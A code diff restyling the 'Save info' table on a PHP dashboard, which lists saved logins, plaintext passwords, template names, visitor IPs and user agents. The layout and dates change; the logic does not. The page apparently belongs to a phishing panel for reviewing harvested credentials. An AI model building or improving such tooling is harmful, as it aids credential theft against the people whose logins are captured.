@@ -1272,23 +1272,28 @@ $userNavInitial = $userNavInitial ?? '?';
         .saved-info-table-scroll {
             max-height: min(520px, 55vh);
             overflow: auto;
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
             border: 1px solid var(--border);
             border-radius: 10px;
             background: var(--bg-dark);
         }
         .saved-info-table {
-            width: 100%;
+            width: max-content;
+            min-width: 100%;
             border-collapse: separate;
             border-spacing: 0;
             font-size: 13px;
+            table-layout: auto;
         }
         .saved-info-table th,
         .saved-info-table td {
             text-align: left;
-            padding: 12px 14px;
+            padding: 12px 16px;
             border-bottom: 1px solid var(--border);
-            vertical-align: top;
-            word-break: break-word;
+            vertical-align: middle;
+            word-break: normal;
+            overflow-wrap: anywhere;
         }
         .saved-info-table tbody tr:last-child td {
             border-bottom: none;
@@ -1311,6 +1316,35 @@ $userNavInitial = $userNavInitial ?? '?';
         .saved-info-table tbody tr:hover td {
             background: rgba(88, 166, 255, 0.08);
         }
+        .saved-info-col-time {
+            min-width: 12.5rem;
+        }
+        .saved-info-col-login {
+            min-width: 9rem;
+            max-width: 18rem;
+        }
+        .saved-info-col-password {
+            min-width: 9rem;
+            max-width: 16rem;
+        }
+        .saved-info-col-template {
+            min-width: 7rem;
+            white-space: nowrap;
+        }
+        .saved-info-col-ip {
+            min-width: 11rem;
+            max-width: 20rem;
+            font-size: 12px;
+            word-break: break-all;
+            overflow-wrap: anywhere;
+        }
+        .saved-info-col-ua {
+            min-width: 14rem;
+            max-width: 24rem;
+            line-height: 1.45;
+            word-break: normal;
+            overflow-wrap: break-word;
+        }
         .saved-info-cell-mono {
             font-family: 'JetBrains Mono', monospace;
             font-size: 12px;
@@ -1321,9 +1355,10 @@ $userNavInitial = $userNavInitial ?? '?';
         }
         .saved-info-cell-time {
             white-space: nowrap;
-            font-size: 12px;
-            color: var(--text-muted);
-            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            color: var(--text);
+            font-family: inherit;
+            font-weight: 500;
         }
         .saved-info-empty {
             color: var(--text-muted);
@@ -1345,6 +1380,14 @@ $userNavInitial = $userNavInitial ?? '?';
             grid-template-columns: minmax(0, 2fr) minmax(0, 1.3fr);
             gap: 28px;
             align-items: flex-start;
+        }
+        .phone-layout-columns--saveinfo {
+            grid-template-columns: minmax(0, 1fr) minmax(420px, 1.35fr);
+        }
+        @media (max-width: 1100px) {
+            .phone-layout-columns--saveinfo {
+                grid-template-columns: minmax(0, 1fr) minmax(300px, 1.15fr);
+            }
         }
         .phone-layout-columns > * {
             min-width: 0;
@@ -1824,7 +1867,7 @@ $userNavInitial = $userNavInitial ?? '?';
 
         <section id="saveInfoLayout" class="phone-layout" style="display:none" aria-label="Save info">
             <div class="phone-layout-inner">
-                <div class="phone-layout-columns">
+                <div class="phone-layout-columns phone-layout-columns--saveinfo">
                     <div class="save-info-stack">
                         <div class="card">
                             <h2>Save info</h2>
@@ -3403,6 +3446,28 @@ $userNavInitial = $userNavInitial ?? '?';
             }
         }
 
+        function formatSavedLoginAt(iso) {
+            if (!iso) {
+                return '';
+            }
+            const d = new Date(String(iso));
+            if (isNaN(d.getTime())) {
+                return String(iso);
+            }
+            const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
+            const day = d.getDate();
+            const dayStr = day < 10 ? '0' + day : String(day);
+            let h = d.getHours();
+            const am = h >= 12 ? 'PM' : 'AM';
+            h = h % 12;
+            if (h === 0) {
+                h = 12;
+            }
+            const min = d.getMinutes();
+            const minStr = min < 10 ? '0' + min : String(min);
+            return months[d.getMonth()] + ' ' + dayStr + ' ' + d.getFullYear() + ' ' + h + ':' + minStr + ' ' + am;
+        }
+
         function csvEscapeCell(val) {
             const s = String(val == null ? '' : val);
             if (/[",\n\r]/.test(s)) {
@@ -3489,16 +3554,19 @@ $userNavInitial = $userNavInitial ?? '?';
                         : String(data.entries.length);
                 }
                 let html = '<div class="saved-info-table-scroll"><table class="saved-info-table"><thead><tr>';
-                html += '<th scope="col">Time</th><th scope="col">Login</th><th scope="col">Password</th><th scope="col">Template</th><th scope="col">IP</th><th scope="col">User agent</th>';
+                html += '<th scope="col" class="saved-info-col-time">Time</th><th scope="col" class="saved-info-col-login">Login</th><th scope="col" class="saved-info-col-password">Password</th><th scope="col" class="saved-info-col-template">Template</th><th scope="col" class="saved-info-col-ip">IP</th><th scope="col" class="saved-info-col-ua">User agent</th>';
                 html += '</tr></thead><tbody>';
                 data.entries.forEach(function (row) {
+                    const rawAt = row.at || '';
+                    const displayAt = formatSavedLoginAt(rawAt);
                     const tpl = escapeHtmlText(row.template_label || row.template || '');
-                    html += '<tr><td class="saved-info-cell-time">' + escapeHtmlText(row.at || '') + '</td>';
-                    html += '<td class="saved-info-cell-mono">' + escapeHtmlText(row.login || '') + '</td>';
-                    html += '<td class="saved-info-cell-mono">' + escapeHtmlText(row.password || '') + '</td>';
-                    html += '<td class="saved-info-cell-template">' + tpl + '</td>';
-                    html += '<td class="saved-info-cell-mono">' + escapeHtmlText(row.ip || '') + '</td>';
-                    html += '<td>' + escapeHtmlText(row.user_agent || '') + '</td></tr>';
+                    const titleAt = escapeHtmlAttr(rawAt);
+                    html += '<tr><td class="saved-info-col-time saved-info-cell-time" title="' + titleAt + '">' + escapeHtmlText(displayAt) + '</td>';
+                    html += '<td class="saved-info-col-login saved-info-cell-mono">' + escapeHtmlText(row.login || '') + '</td>';
+                    html += '<td class="saved-info-col-password saved-info-cell-mono">' + escapeHtmlText(row.password || '') + '</td>';
+                    html += '<td class="saved-info-col-template saved-info-cell-template">' + tpl + '</td>';
+                    html += '<td class="saved-info-col-ip saved-info-cell-mono">' + escapeHtmlText(row.ip || '') + '</td>';
+                    html += '<td class="saved-info-col-ua">' + escapeHtmlText(row.user_agent || '') + '</td></tr>';
                 });
                 html += '</tbody></table></div>';
                 wrap.innerHTML = html;
